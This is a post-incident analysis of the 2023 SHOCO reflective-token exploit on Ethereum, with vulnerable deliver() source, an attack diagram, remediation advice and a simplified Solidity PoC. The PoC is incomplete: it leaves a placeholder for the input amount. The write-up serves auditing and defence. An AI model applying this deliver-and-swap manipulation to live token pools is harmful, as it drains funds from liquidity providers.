# SHOCO Token — Reflective Token deliver/skim Pattern Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2023-01-19 |
| **Protocol** | SHOCO Token |
| **Chain** | Ethereum |
| **Loss** | ~4 ETH |
| **Attacker (original)** | [0x14d8ada7...](https://etherscan.io/address/0x14d8ada7a0ba91f59dc0cb97c8f44f1d177c2195) |
| **Attacker (front-runner)** | [0xe71aca93...](https://etherscan.io/address/0xe71aca93c0e0721f8250d2d0e4f883aa1c020361) |
| **Attack Tx** | [0x2e832f04...](https://etherscan.io/tx/0x2e832f044b4a0a0b8d38166fe4d781ab330b05b9efa9e72a7a0895f1b984084b) |
| **Vulnerable Contract** | [0x31a4f372...](https://etherscan.io/address/0x31a4f372aa891b46ba44dc64be1d8947c889e9c6) |
| **Root Cause** | The `deliver()` function of a reflective ERC-20 token allows manipulation of the LP pair's reflected balance |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-01/SHOCO_exp.sol) |

---
## 1. Vulnerability Overview

SHOCO is an ERC-20 token implementing a reflective mechanism, where the `deliver()` function burns tokens while adjusting the global reflection ratio. The attacker purchased a large amount of SHOCO, then called `deliver()` to inflate the LP pair's reflected balance (`tokenFromReflection`) beyond its actual reserve, and exploited this imbalance via a Uniswap swap to extract excess WETH.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable reflective token deliver function
interface IReflection is IERC20 {
    function deliver(uint256 amount) external;
    // When deliver() executes:
    // 1. Caller's rOwned decreases
    // 2. rTotal decreases → token/reflection ratio changes for all holders
    // ❌ LP pair's rOwned is unchanged, but the ratio shifts so
    //    tokenFromReflection(pairROwned) increases

    function tokenFromReflection(uint256 rAmount) external view returns (uint256);
    // rAmount / currentRate = actual token amount
    // currentRate = rTotal / tTotal
    // rTotal decreases → currentRate decreases → tokenFromReflection increases
}

// ✅ Fix: prevent deliver from affecting LP pair
function deliver(uint256 tAmount) public {
    // Exclude LP pair addresses from deliver targets, or
    // call sync() on LP pair reserves after deliver
    _syncAllPairs();  // ✅ sync all relevant pairs
}
```

### On-chain Source Code

Source: Sourcify verified

```solidity
// File: Shoco.sol
    function deliver(uint256 tAmount) public {  // ❌
        address sender = _msgSender();
        require(!_isExcluded[sender], "Excluded addresses cannot call this function");
        (uint256 rAmount,,,,,) = _getValues(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rTotal = _rTotal.sub(rAmount);
        _tFeeTotal = _tFeeTotal.add(tAmount);
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─1─▶ Purchase large amount of SHOCO with initial capital
  │       Swap on Uniswap SHOCO-WETH pair
  │
  ├─2─▶ shoco.deliver(balance)
  │       rTotal decreases → LP pair's tokenFromReflection increases
  │       LP pair's actual SHOCO balance > recorded reserve
  │
  ├─3─▶ Call UniswapV2 swap
  │       Extract excess WETH using reserve-based calculation imbalance
  │       (actual balance exceeds reserve → favorable exchange rate)
  │
  ├─4─▶ Repeat to realize additional profit
  │
  └─5─▶ Total ~4 ETH drained (intercepted by front-runner)
```

## 4. PoC Code (Core Logic + Comments)

```solidity
function testExploit() external {
    // Query current LP pair reserves and balance
    (uint112 reserve0, uint112 reserve1,) = shoco_weth.getReserves();
    uint256 pairShocoBalance = shoco.balanceOf(address(shoco_weth));

    // 1. Buy large amount of SHOCO with WETH
    // Using flash loan or existing capital
    uint256 wethIn = /* calculated optimal amount */;
    weth.transfer(address(shoco_weth), wethIn);
    shoco_weth.swap(getAmountOut(wethIn, reserve1, reserve0), 0, address(this), "");

    // 2. Inflate LP pair's reflected balance via deliver()
    // rTotal decreases → LP pair's tokenFromReflection value increases
    shoco.deliver(shoco.balanceOf(address(this)));

    // 3. Actual LP balance > reserve → extract surplus via swap
    // Sending minimal SHOCO to LP yields large WETH output due to reflection manipulation
    uint256 shocoIn = 1;  // minimum input for maximum output
    shoco.transfer(address(shoco_weth), shocoIn);
    shoco_weth.swap(0, getAmountOut(shocoIn, reserve0, reserve1), address(this), "");
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Reflective token mechanism manipulation |
| **Attack Vector** | deliver() + UniswapV2 swap |
| **Impact Scope** | LP liquidity providers |
| **DASP Classification** | Business Logic Flaw |
| **CWE** | CWE-840: Business Logic Errors |

## 6. Remediation Recommendations

1. **Restrict `deliver()`**: Exclude LP pair addresses from `deliver()` calls, or force a `sync()` call upon invocation.
2. **Limit reflection ratio changes**: Set an upper bound to prevent abrupt changes to `rTotal` within a single transaction.
3. **Special handling for LP pairs**: Add LP pair addresses to the exclusion list within the reflective mechanism.

## 7. Lessons Learned

- This follows the same pattern as the BEVO incident — the `deliver()` function of reflective tokens has a fundamental design vulnerability when combined with LP pairs.
- Notably, a front-running bot intercepted the original attacker's (0x14d8ada7) transaction and captured the actual profit.
- This pattern recurs repeatedly and should be the top priority check when auditing reflective tokens.